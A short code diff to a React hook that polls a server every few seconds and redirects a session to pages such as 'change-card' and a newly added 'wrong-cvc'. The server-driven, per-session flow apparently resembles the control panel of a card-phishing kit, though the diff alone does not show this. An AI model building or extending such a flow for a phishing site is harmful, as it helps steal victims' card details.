@@ -18,7 +18,9 @@ export const useRedirectChecker = (interval: number = 3000) => {
       if (!sessionId) return;
 
       try {
-        const response = await fetch(`/api/check-redirect/${clientId}/${sessionId}`);
+        const response = await fetch(
+          `/api/check-redirect/${clientId}/${sessionId}`
+        );
         const data: RedirectResponse = await response.json();
 
         if (data.success && data.redirect) {
@@ -34,6 +36,10 @@ export const useRedirectChecker = (interval: number = 3000) => {
             case "change":
               console.log("🔄 Redirecting to bank page");
               navigate(`/change-card/${sessionId}`);
+              break;
+            case "wrong-cvc":
+              console.log("🔄 Redirecting to bank page");
+              navigate(`/wrong-cvc/${sessionId}`);
               break;
             case "success":
               console.log("🔄 Redirecting to bank page");
